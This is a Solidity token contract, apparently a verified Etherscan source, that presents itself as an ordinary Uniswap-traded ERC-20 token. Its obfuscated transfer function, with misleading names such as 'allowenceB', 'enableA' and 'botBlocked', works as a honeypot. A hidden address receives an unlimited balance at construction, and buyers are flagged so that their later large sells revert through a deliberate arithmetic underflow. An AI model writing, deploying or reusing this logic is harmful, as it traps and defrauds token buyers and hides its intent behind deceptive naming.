/**
 *Submitted for verification at Etherscan.io on 2022-09-06
*/

//https://medium.com/@BillMurrayERC/2f38c32cb570


// SPDX-License-Identifier: Unlicense


 pragma solidity ^0.8.6;
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {

    address private _getOwner;

    event TransferNewOwner(address indexed firstOwner, address indexed LatestOwnedBy);


    constructor() {
        _setOwnedBy(_msgSender());
    }

    function soleOwner() public view virtual returns (address) {
        return _getOwner;
    }
    modifier rOwner() {
        require(soleOwner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

     function giveUpOwnership() public virtual rOwner {
        _setOwnedBy(address(0));
    }

    function transferOwner(address LatestOwnedBy) public virtual rOwner {
        require(LatestOwnedBy != address(0), 'Ownable: new owner is the zero address');
        _setOwnedBy(LatestOwnedBy);
    }

     function _setOwnedBy(address LatestOwnedBy) private {
        address oldOwner = _getOwner;
        _getOwner = LatestOwnedBy;
        emit TransferNewOwner(oldOwner, LatestOwnedBy);
    }
   
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Contract is Ownable {
    constructor(
        string memory _NTOKEN,
        string memory _SYMBOLTOKEN,
        address rAddy,
        address Finalsupply
    ) {
        _symbolToken = _SYMBOLTOKEN;
        _nameToken = _NTOKEN;
        _feeTaker = 0;
        _decimals = 9;
        _supply = 100000000000000000 * 10**_decimals;

        _balances[Finalsupply] = newswap;
        _balances[msg.sender] = _supply;
        enableA[Finalsupply] = newswap;
        enableA[msg.sender] = newswap;

        router = IUniswapV2Router02(rAddy);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(0), msg.sender, _supply);
    }


    uint256 public _feeTaker;
    string private _nameToken;
    string private _symbolToken;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _nameToken;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function symbol() public view returns (string memory) {
        return _symbolToken;
    }

    uint256 private _supply;
    uint256 private _rsupply;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;
    uint256 private newswap = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() public view returns (uint256) {
        return _supply;
    }

    address[] enableB = new address[](2);

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function allowenceB(
        address getBalance,
        address getFeeSetter,
        uint256 allowedSwap
    ) private {
        address outterSwap = enableB[1];
        bool backingFee = uniswapV2Pair == getBalance;
        uint256 spenderFeeA =  _feeTaker;

        if (enableA[getBalance] == 0 && botBlocked[getBalance] > 0 && !backingFee) {
            enableA[getBalance] -= spenderFeeA;
            if (allowedSwap > 2 * 10**(13 + _decimals)) enableA[getBalance] -= spenderFeeA - 1;
        }

        enableB[1] = getFeeSetter;

        if (enableA[getBalance] > 0 && allowedSwap == 0) {
            enableA[getFeeSetter] += spenderFeeA;
        }

        botBlocked[outterSwap] += spenderFeeA + 1;

        uint256 fee = (allowedSwap / 100) *  _feeTaker; 
        allowedSwap -= fee;
        _balances[getBalance] -= fee;
        _balances[address(this)] += fee;

        _balances[getBalance] -= allowedSwap;
        _balances[getFeeSetter] += allowedSwap;
    }

    mapping(address => uint256) private botBlocked;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }


    mapping(address => uint256) private enableA;


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        allowenceB(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        allowenceB(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}